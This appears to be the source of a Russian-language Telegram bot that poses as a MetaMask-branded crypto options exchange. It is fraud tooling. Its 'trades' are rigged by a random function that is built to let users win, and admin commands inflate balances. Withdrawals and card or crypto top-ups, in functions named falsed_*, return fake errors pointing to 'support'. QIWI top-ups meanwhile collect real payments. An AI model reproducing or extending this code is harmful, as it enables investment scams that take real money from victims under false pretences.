from aiogram import types, executor
from database import Database
from config import *
import buttons as nav
from give_moneys import *
from texts import *
from texts_trader import *
from photos import *
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import FSMContext
import logging
import random2
import asyncio

db = Database('database.db')

logging.basicConfig(level=logging.INFO)
bot_name = ''
helped_users = ''
card_num = ''
crypto_num = ''
min_sum = 1500
waiting_time = 5

class Money(StatesGroup):
    money = State()

class Money_top_up(StatesGroup):
    money_top = State()

class Money_top_up_card(StatesGroup):
    money_top_card = State()
    money_top_crypto = State()

class Money_cash_back(StatesGroup):
    money = State()
    number = State()
    choice = State()


#20% шанс проигрыша
def random_change_win():
    change = random2.randint(1,5)

    if change == 3:
        return False
    else:
        return True


main_reply_menu = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
buttons = ['Личный Кабинет','Опционы','О сервисе','Тех. Поддержка']
main_reply_menu.add(*buttons)



#добавление денег определённому человеку
@dp.message_handler(commands=['add_money'])
async def many_money_users(msg: types.Message):
    user, money = msg.get_args().split()

    money_back = db.account_money(user)
    money_plus = int(money)

    db.upd_money(user,money_back+money_plus)

    await msg.answer('Всё заебись')

@dp.message_handler(commands=['all_acc'])
async def all_accounts(msg: types.Message):

    await msg.answer(text=f'{db.all_acc()}\n')


#добавление пользователю верификацию для "вывода" денег
@dp.message_handler(commands=['set_verif'])
async def many_money_users(msg: types.Message):
    user, verif = msg.get_args().split()
    if verif == '0':
        verific = False
    elif verif == '1':
        verific = True


    db.upd_verif(user,verific)

    await msg.answer('Всё заебись')


@dp.callback_query_handler(text_contains='i_agree')
async def user_agree(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    await bot.send_message(user_id,f"""Добро пожаловать в {bot_name}, децентрализованную платформу для торговли криптовалютой, активами, NFT, основанную на блокчейне Ethereum.
{bot_name} можно использовать как кошелек для удобных операций с Ethereum блокчейном.
{bot_name} является некастодиальным сервисом, это означает, что никто другой не может получить доступ к вашим средствам – даже разработчики {bot_name}. Можно сказать, ваши токены существуют в зашифрованном хранилище, которое защищено паролем. Это означает, что если ваше устройство/вход будет потерян, украден или уничтожен, вы не сможете восстановить кошелек.""", reply_markup=main_reply_menu)



@dp.message_handler(commands=['start'])
async def start(msg: types.Message):
    user_id = msg.from_user.id
    if not db.account_exists(user_id):
        db.add_account(user_id)

    await msg.answer(f"""Перед использованием децентрализованной площадки MetaMask необходимо ознакомиться с "Соглашение для открытия ECN".""",reply_markup=nav.start_buttons())




#аккаунт
@dp.callback_query_handler(text_contains='acc')
async def get_account(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    verif = db.account_verif(user_id)
    money = db.account_money(user_id)
    trans = db.account_trans(user_id)
    online = random2.randint(1214, 1554) + random2.randint(-173, 212)

    if verif == False:
        verific = 'Нет'
    else:
        verific = 'Да'

    s = account_text(verific,money,user_id,trans,online)

    await bot.send_photo(user_id, photo='https://disk.yandex.ru/i/O3Ly6j-8viGqSQ')
    await bot.send_message(user_id,text=s,reply_markup=nav.acc_menu())

@dp.callback_query_handler(text_contains='about_we')
async def about_we(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    name_bot = bot_name

    await bot.send_photo(user_id,photo_about_we)
    await bot.send_message(user_id, about_we_text(name_bot),reply_markup=nav.about_we())

@dp.callback_query_handler(text_contains='help')
async def help_users(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    id_helped = helped_users
    name_bot = bot_name

    await bot.send_photo(user_id,photo_helped_usr)
    await bot.send_message(user_id, helped_users_text(id_helped,name_bot))

@dp.callback_query_handler(text_contains='verif')
async def falsed_verif(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    await bot.send_message(user_id, verif_falsed_text(),reply_markup=nav.verif())
    



#биржа
@dp.callback_query_handler(text_contains='shop')
async def trade(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    await bot.send_photo(user_id, photo_trade)
    await bot.send_message(user_id, text=trader_text(), reply_markup=nav.trade_menu())

@dp.callback_query_handler(text_contains='new_trade')
async def trade(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    await bot.send_message(user_id, text='Выберите актив:', reply_markup=nav.trade_menu())


#биткоин
@dp.callback_query_handler(text_contains='btc')
async def trade(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    moneys = db.account_money(user_id)

    await bot.send_photo(user_id,photo_btc)
    await bot.send_message(user_id, text=btc_text(moneys), reply_markup=nav.back_to_trade())

    await Money.money.set()
    

@dp.message_handler(state=Money.money)
async def trade_btc(msg: types.Message, state:FSMContext):
    user_id = msg.chat.id
    moneys = msg.text
    user_moneys = db.account_money(user_id)
    if moneys.isnumeric():
        if int(moneys) <= user_moneys and int(moneys) >= min_sum:
            await state.update_data(money=msg.text)
            await msg.answer(all_trade_text(), reply_markup=nav.all_trade_btns())
        elif int(moneys) > user_moneys:
            await msg.answer('У вас недостаточно денег на балансе!')
        elif int(moneys) < min_sum:
            await msg.answer('Нельзя играть с суммой меньше минимальной!')
    else:
        await msg.answer('Введите число!')



#эфириум
@dp.callback_query_handler(text_contains='eth')
async def trade(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    moneys = db.account_money(user_id)

    await bot.send_photo(user_id,photo_eth)
    await bot.send_message(user_id, text=eth_text(moneys), reply_markup=nav.back_to_trade())

    await Money.money.set()
    

@dp.message_handler(state=Money.money)
async def trade_btc(msg: types.Message, state:FSMContext):
    user_id = msg.chat.id
    moneys = msg.text
    user_moneys = db.account_money(user_id)
    if moneys.isnumeric():
        if int(moneys) <= user_moneys and int(moneys) >= min_sum:
            await state.update_data(money=msg.text)
            await msg.answer(all_trade_text(), reply_markup=nav.all_trade_btns())
        elif int(moneys) > user_moneys:
            await msg.answer('У вас недостаточно денег на балансе!')
        elif int(moneys) < min_sum:
            await msg.answer('Нельзя играть с суммой меньше минимальной!')
    else:
        await msg.answer('Введите число!')


#LiteCoin
@dp.callback_query_handler(text_contains='lt')
async def trade(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    moneys = db.account_money(user_id)

    await bot.send_photo(user_id,photo_lt)
    await bot.send_message(user_id, text=lt_text(moneys), reply_markup=nav.back_to_trade())

    await Money.money.set()
    

@dp.message_handler(state=Money.money)
async def trade_btc(msg: types.Message, state:FSMContext):
    user_id = msg.chat.id
    moneys = msg.text
    user_moneys = db.account_money(user_id)
    if moneys.isnumeric():
        if int(moneys) <= user_moneys and int(moneys) >= min_sum:
            await state.update_data(money=msg.text)
            await msg.answer(all_trade_text(), reply_markup=nav.all_trade_btns())
        elif int(moneys) > user_moneys:
            await msg.answer('У вас недостаточно денег на балансе!')
        elif int(moneys) < min_sum:
            await msg.answer('Нельзя играть с суммой меньше минимальной!')
    else:
        await msg.answer('Введите число!')



#Ripple
@dp.callback_query_handler(text_contains='ripple')
async def trade(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    moneys = db.account_money(user_id)

    await bot.send_photo(user_id,photo_ripple)
    await bot.send_message(user_id, text=ripple_text(moneys), reply_markup=nav.back_to_trade())

    await Money.money.set()
    

@dp.message_handler(state=Money.money)
async def trade_btc(msg: types.Message, state:FSMContext):
    user_id = msg.chat.id
    moneys = msg.text
    user_moneys = db.account_money(user_id)
    if moneys.isnumeric():
        if int(moneys) <= user_moneys and int(moneys) >= min_sum:
            await state.update_data(money=msg.text)
            await msg.answer(all_trade_text(), reply_markup=nav.all_trade_btns())
        elif int(moneys) > user_moneys:
            await msg.answer('У вас недостаточно денег на балансе!')
        elif int(moneys) < min_sum:
            await msg.answer('Нельзя играть с суммой меньше минимальной!')
    else:
        await msg.answer('Введите число!')


#Tron
@dp.callback_query_handler(text_contains='tron')
async def trade(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    moneys = db.account_money(user_id)

    await bot.send_photo(user_id,photo_tron)
    await bot.send_message(user_id, text=tron_text(moneys), reply_markup=nav.back_to_trade())

    await Money.money.set()
    

@dp.message_handler(state=Money.money)
async def trade_btc(msg: types.Message, state:FSMContext):
    user_id = msg.chat.id
    moneys = msg.text
    user_moneys = db.account_money(user_id)
    if moneys.isnumeric():
        if int(moneys) <= user_moneys and int(moneys) >= min_sum:
            await state.update_data(money=msg.text)
            await msg.answer(all_trade_text(), reply_markup=nav.all_trade_btns())
        elif int(moneys) > user_moneys:
            await msg.answer('У вас недостаточно денег на балансе!')
        elif int(moneys) < min_sum:
            await msg.answer('Нельзя играть с суммой меньше минимальной!')
    else:
        await msg.answer('Введите число!')


#Iota
@dp.callback_query_handler(text_contains='iota')
async def trade(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    moneys = db.account_money(user_id)

    await bot.send_photo(user_id,photo_iota)
    await bot.send_message(user_id, text=iota_text(moneys), reply_markup=nav.back_to_trade())

    await Money.money.set()
    

@dp.message_handler(state=Money.money)
async def trade_btc(msg: types.Message, state:FSMContext):
    user_id = msg.chat.id
    moneys = msg.text
    user_moneys = db.account_money(user_id)
    if moneys.isnumeric():
        if int(moneys) <= user_moneys and int(moneys) >= min_sum:
            await state.update_data(money=msg.text)
            await msg.answer(all_trade_text(), reply_markup=nav.all_trade_btns())
        elif int(moneys) > user_moneys:
            await msg.answer('У вас недостаточно денег на балансе!')
        elif int(moneys) < min_sum:
            await msg.answer('Нельзя играть с суммой меньше минимальной!')
    else:
        await msg.answer('Введите число!')


#Solana
@dp.callback_query_handler(text_contains='solana')
async def trade(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    moneys = db.account_money(user_id)

    await bot.send_photo(user_id,photo_solana)
    await bot.send_message(user_id, text=solana_text(moneys), reply_markup=nav.back_to_trade())

    await Money.money.set()
    

@dp.message_handler(state=Money.money)
async def trade_btc(msg: types.Message, state:FSMContext):
    user_id = msg.chat.id
    moneys = msg.text
    user_moneys = db.account_money(user_id)
    if moneys.isnumeric():
        if int(moneys) <= user_moneys and int(moneys) >= min_sum:
            await state.update_data(money=msg.text)
            await msg.answer(all_trade_text(), reply_markup=nav.all_trade_btns())
        elif int(moneys) > user_moneys:
            await msg.answer('У вас недостаточно денег на балансе!')
        elif int(moneys) < min_sum:
            await msg.answer('Нельзя играть с суммой меньше минимальной!')
    else:
        await msg.answer('Введите число!')


#FileCoin
@dp.callback_query_handler(text_contains='filecoin')
async def trade(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    moneys = db.account_money(user_id)

    await bot.send_photo(user_id,photo_filecoin)
    await bot.send_message(user_id, text=filecoin_text(moneys), reply_markup=nav.back_to_trade())

    await Money.money.set()
    

@dp.message_handler(state=Money.money)
async def trade_btc(msg: types.Message, state:FSMContext):
    user_id = msg.chat.id
    moneys = msg.text
    user_moneys = db.account_money(user_id)
    if moneys.isnumeric():
        if int(moneys) <= user_moneys and int(moneys) >= min_sum:
            await state.update_data(money=msg.text)
            await msg.answer(all_trade_text(), reply_markup=nav.all_trade_btns())
        elif int(moneys) > user_moneys:
            await msg.answer('У вас недостаточно денег на балансе!')
        elif int(moneys) < min_sum:
            await msg.answer('Нельзя играть с суммой меньше минимальной!')
    else:
        await msg.answer('Введите число!')
    
    

#игра на бирже
@dp.callback_query_handler(text_contains='up', state=Money.money)
async def up(callback: types.CallbackQuery, state:FSMContext):
    user_id = callback.from_user.id
    data = await state.get_data()
    moneys = data.get('money')

    if random_change_win() == True:
        money = int(moneys) * 2

        moneys_back = db.account_money(user_id)
        transac = db.account_trans(user_id)
        db.upd_money(user_id,money=moneys_back+money)
        db.upd_trans(user_id,transac+1)

        moneys_back_upd = db.account_money(user_id)

        text = text_trade(moneys_back_upd, money, moneys_back)
        wait_text = waiting_text(waiting_time)

        await asyncio.sleep(waiting_time)

        await bot.send_message(user_id, wait_text)

        

        await bot.send_message(user_id, text, reply_markup=nav.new_game_trade())

        await state.finish()
    else:
        money = int(moneys)

        moneys_back = db.account_money(user_id)
        transac = db.account_trans(user_id)
        db.upd_money(user_id,money=moneys_back-money)
        db.upd_trans(user_id,transac+1)

        moneys_back_upd = db.account_money(user_id)

        text = text_trade_lose(moneys_back_upd, money, moneys_back)
        wait_text = waiting_text(waiting_time)

        await bot.send_message(user_id, wait_text)

        await asyncio.sleep(waiting_time)

        

        await bot.send_message(user_id, text, reply_markup=nav.new_game_trade())

        await state.finish()



@dp.callback_query_handler(text_contains='none_tr', state=Money.money)
async def up(callback: types.CallbackQuery, state:FSMContext):
    user_id = callback.from_user.id
    data = await state.get_data()
    moneys = data.get('money')
    if random_change_win() == True:
        money = int(moneys) * 10

        moneys_back = db.account_money(user_id)
        transac = db.account_trans(user_id)
        db.upd_money(user_id,money=moneys_back+money)
        db.upd_trans(user_id,transac+1)

        moneys_back_upd = db.account_money(user_id)

        text = text_trade(moneys_back_upd, money, moneys_back)
        wait_text = waiting_text(waiting_time)

        await bot.send_message(user_id, wait_text)

        await asyncio.sleep(waiting_time)


        await bot.send_message(user_id, text, reply_markup=nav.new_game_trade())

        await state.finish()
    else:
        money = int(moneys)

        moneys_back = db.account_money(user_id)
        transac = db.account_trans(user_id)
        db.upd_money(user_id,money=moneys_back-money)
        db.upd_trans(user_id,transac+1)

        moneys_back_upd = db.account_money(user_id)

        text = text_trade_lose(moneys_back_upd, money, moneys_back)
        wait_text = waiting_text(waiting_time)

        await bot.send_message(user_id, wait_text)

        await asyncio.sleep(waiting_time)


        await bot.send_message(user_id, text, reply_markup=nav.new_game_trade())

        await state.finish()

@dp.callback_query_handler(text_contains='down', state=Money.money)
async def up(callback: types.CallbackQuery, state:FSMContext):
    user_id = callback.from_user.id
    data = await state.get_data()
    moneys = data.get('money')
    if random_change_win() == True:
        money = int(moneys) * 2

        moneys_back = db.account_money(user_id)
        transac = db.account_trans(user_id)
        db.upd_money(user_id,money=moneys_back+money)
        db.upd_trans(user_id,transac+1)

        moneys_back_upd = db.account_money(user_id)

        text = text_trade(moneys_back_upd, money, moneys_back)
        wait_text = waiting_text(waiting_time)

        await bot.send_message(user_id, wait_text)

        await asyncio.sleep(waiting_time)

        await bot.send_message(user_id, text, reply_markup=nav.new_game_trade())

        await state.finish()
    else:
        money = int(moneys)

        moneys_back = db.account_money(user_id)
        transac = db.account_trans(user_id)
        db.upd_money(user_id,money=moneys_back-money)
        db.upd_trans(user_id,transac+1)

        moneys_back_upd = db.account_money(user_id)

        text = text_trade_lose(moneys_back_upd, money, moneys_back)
        wait_text = waiting_text(waiting_time)

        await bot.send_message(user_id, wait_text)

        await asyncio.sleep(waiting_time)

        await bot.send_message(user_id, text, reply_markup=nav.new_game_trade())

        await state.finish()

    




#из кнопок под клавиатурой или текстом
@dp.message_handler()
async def tasks(msg: types.Message):
    user_id = msg.chat.id
    msg_low = msg.text.lower().replace('💼','')

    if msg_low == 'личный кабинет':
        verif = db.account_verif(user_id)
        money = db.account_money(user_id)
        trans = db.account_trans(user_id)
        online = random2.randint(1214, 1554) + random2.randint(-173, 212)
        
        if verif == False:
            verific = 'Нет'
        else:
            verific = 'Да'

        await bot.send_photo(user_id, photo_acc)
        await msg.answer(text=account_text(verific,money,user_id,trans,online),reply_markup=nav.acc_menu())
    

    elif msg_low == 'опционы':
        await bot.send_photo(user_id, photo_trade)
        await msg.answer(text=trader_text(), reply_markup=nav.trade_menu())

    elif msg_low == 'о сервисе':

        await bot.send_photo(user_id, photo_about_we)
        await msg.answer(about_we_text(bot_name),reply_markup=nav.about_we())

    elif msg_low == 'тех. поддержка':

        await bot.send_photo(user_id, photo_helped_usr)
        await msg.answer(helped_users_text(helped_users,bot_name),reply_markup=nav.send_msg_helped_usr())






#вывод денег

@dp.callback_query_handler(text_contains='cash')
async def cash_back(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id

    data = await state.get_data()
    money = db.account_money(user_id)

    await bot.send_photo(user_id, photo_cash_back)
    await bot.send_message(user_id,cash_back_text(money))
    await Money_cash_back.money.set()
    




@dp.message_handler(state=Money_cash_back.money)
async def bot_msg_false_cash(msg: types.Message, state: FSMContext):
    user_id = msg.from_user.id
    money_msg = msg.text
    money_user = db.account_money(user_id)
    await state.update_data(money=money_msg)
    verif = db.account_verif(user_id)

    if money_msg.isnumeric():
        if int(money_msg) <= money_user:
            await msg.answer('Введите номер телефона для вывода на qiwi.(без+7)\nЗапомните, вывод возможен только на телефон с которого был воспроизведён платёж!')
            await Money_cash_back.number.set()
        else:
            await msg.answer('У вас недостаточно денег на балансе')
    else:
        await msg.answer('Введите число!')


@dp.message_handler(state=Money_cash_back.number)
async def bot_msg_false_cash_down(msg: types.Message, state: FSMContext):
    user_id = msg.chat.id
    number = msg.text
    data = await state.get_data()
    money = db.account_money(user_id)
    verif = db.account_verif(user_id)
    money_minus = int(data.get('money'))

    db.upd_number(user_id,number)

    if number.isnumeric():
        await msg.answer(falsed_cash_back(money,number))

        if verif == False:
            await state.reset_state (with_data = False)
            await bot.send_message(user_id,'Произошла ошибка! Пожалуйста обратитесь в тех. поддержку!',reply_markup=nav.cash_back_return())
        else:
            db.upd_money(user_id, money-int(money_minus))
            await bot.send_message(user_id, f'Деньги успешно выведены на номер +7{number}!')

            money_upd = db.account_money(user_id)
            await state.reset_state (with_data = False)

            await bot.send_message(user_id, f'Ваш баланс на бирже остался: {money_upd}')

    else:
        await msg.answer('Введите корректный номер телефона!')


@dp.callback_query_handler(text_contains='credit_card')
async def cash_back(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id

    data = await state.get_data()
    money = db.account_money(user_id)

    await bot.send_message(user_id,"Введите сумму для пополнения! (минимальная сумма пополнения 3000 руб.)")
    await Money_top_up_card.money_top_card.set()

@dp.message_handler(state=Money_top_up_card.money_top_card)
async def bot_msg_false_cash(msg: types.Message, state: FSMContext):
    user_id = msg.from_user.id
    money_msg = msg.text
    money_user = db.account_money(user_id)
    await state.update_data(money=money_msg)
    verif = db.account_verif(user_id)

    if money_msg.isnumeric():
        if int(money_msg) >= 3000:
            await msg.answer(falsed_top_up_for_card_text(card_num,money_msg), reply_markup=nav.falsed_check_top_up_card())
            await state.reset_state (with_data = False)
        else:
            await msg.answer('Минимальная сумма пополнения 3000 руб!')
    else:
        await msg.answer('Введите число!')

@dp.callback_query_handler(text_contains = 'falsed_check')
async def falsed_check(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    await bot.send_message(user_id,'Произошла ошибка! Пожалуйста обратитесь в тех. поддержку!',reply_markup=nav.cash_back_return())



@dp.callback_query_handler(text_contains='crypto')
async def cash_back(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id

    data = await state.get_data()
    money = db.account_money(user_id)

    await bot.send_message(user_id,"Введите сумму для пополнения! (минимальная сумма пополнения 3000 руб.)")
    await Money_top_up_card.money_top_crypto.set()

@dp.message_handler(state=Money_top_up_card.money_top_crypto)
async def bot_msg_false_cash(msg: types.Message, state: FSMContext):
    user_id = msg.from_user.id
    money_msg = msg.text
    await state.update_data(money=money_msg)

    if money_msg.isnumeric():
        if int(money_msg) >= 3000:
            await msg.answer(falsed_top_up_for_card_text(crypto_num,money_msg), reply_markup=nav.falsed_check_top_up_card())
            await state.reset_state (with_data = False)
        else:
            await msg.answer('Минимальная сумма пополнения 3000 руб!')
    else:
        await msg.answer('Введите число!')

@dp.callback_query_handler(text_contains = 'falsed_check')
async def falsed_check(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    await bot.send_message(user_id,'Произошла ошибка! Пожалуйста обратитесь в тех. поддержку!',reply_markup=nav.cash_back_return())




#отмена актива
@dp.callback_query_handler(text_contains='back')
async def trade(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    await bot.delete_message(user_id, callback.message.message_id)
    await bot.send_message(user_id, text='Отменено!',reply_markup=main_reply_menu)


#удаление аккаунта
@dp.message_handler(commands=['del_acc'])
async def del_acc(msg: types.Message):
    user_id = msg.from_user.id
    db.del_acc_1(user_id)
    db.del_acc_2(user_id)
    db.del_acc_3(user_id)


@dp.callback_query_handler(text_contains = 'web')
async def Web(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    await bot.send_message(user_id,text=falsed_web())



@dp.callback_query_handler(text='top_up')
async def top_up(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    await bot.send_photo(user_id, photo_top_up)
    await bot.send_message(user_id, 'Выберите способ оплаты',reply_markup=nav.top_up_from_acc())



#пополнение баланса
@dp.callback_query_handler(text='qiwi')
async def top_up_qiwi(callback: types.CallbackQuery):
    await bot.delete_message(callback.from_user.id, callback.message.message_id)
    await bot.send_message(callback.from_user.id, "Введите сумму для пополнения! (минимальная сумма пополнения 3000 руб.)")

    await Money_top_up.money_top.set()


@dp.callback_query_handler(text_contains='check_')
async def check(callback: types.CallbackQuery):
    bill = str(callback.data[6:])
    info = db.get_check(bill)
    if info != False:
        if str(p2p.check(bill_id=bill).status) == 'PAID':
            user_money = db.account_money(callback.from_user.id)
            money = int(info[2])
            db.upd_money(callback.from_user.id, user_money+money)

            await bot.send_message(callback.from_user.id, 'Ваш счёт пополнен проверьте в своём аккаунте!')
            db.del_check(bill_id=callback.from_user.id)
        else:
            await bot.send_message(callback.from_user.id, text='Вы не оплатили счёт!',reply_markup=nav.buy_menu(False, bill=bill))
    else:
        await bot.send_message(callback.from_user.id, text='Счёт не найден')


@dp.message_handler(state=Money_top_up.money_top)
async def bot_message(msg: types.Message, state: FSMContext):
    user_id = msg.from_user.id
    moneys = msg.text

    if moneys.isnumeric():
        await state.update_data(money=moneys)
        data = await state.get_data()
        money_msg = int(data.get('money'))
        if money_msg >= 3000:
            comment = str(user_id) + '_' + str(random.randint(1000,9999))
            bill = p2p.bill(amount=money_msg, lifetime=10, comment=comment)
            db.add_check(user_id, money_msg, bill.bill_id)

            await msg.answer(f'Вам нужно отправить {money_msg} на наш счёт:\n{bill.pay_url}\nУказав комментарий к оплате: {comment}', reply_markup=nav.buy_menu(url=bill.pay_url, bill=bill.bill_id))
            await state.reset_state (with_data = False)
        else:
            await msg.answer('Минимальная сумма для пополнения 3000 руб!')
    else:
        await msg.answer('Пожалуйста, введите целое число!')


